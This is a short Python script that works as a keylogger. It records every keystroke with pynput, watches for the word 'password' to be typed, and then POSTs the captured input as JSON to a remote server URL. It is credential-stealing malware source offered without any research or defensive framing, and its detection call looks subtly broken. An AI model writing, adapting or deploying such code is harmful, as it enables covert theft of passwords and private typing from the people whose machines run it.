import keyboard
import requests
import time
from pynput import keyboard as kb

password_fields_detected = False
recorded_input = ""

def on_press(key):
    global recorded_input
    try:
        recorded_input += key.char
    except AttributeError:
        if key == kb.Key.space:
            recorded_input += " "
        elif key == kb.Key.enter:
            recorded_input += "\n"
        else:
            pass

def monitor_password_fields():
    global password_fields_detected
    while True:
        if "password" in keyboard.get_typed_strings():
            password_fields_detected = True
            break
        time.sleep(0.1)

def send_to_server(data):
    url = "https://your-secure-server.com/api/log"
    headers = {"Content-Type": "application/json"}
    payload = {"input": data}
    try:
        response = requests.post(url, json=payload, headers=headers)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def main():
    global password_fields_detected, recorded_input
    monitor_thread = threading.Thread(target=monitor_password_fields)
    monitor_thread.daemon = True
    monitor_thread.start()

    with kb.Listener(on_press=on_press) as listener:
        while True:
            if password_fields_detected:
                if len(recorded_input) > 0:
                    if send_to_server(recorded_input):
                        recorded_input = ""
                    else:
                        time.sleep(1)
            time.sleep(0.1)

if __name__ == "__main__":
    import threading
    main()
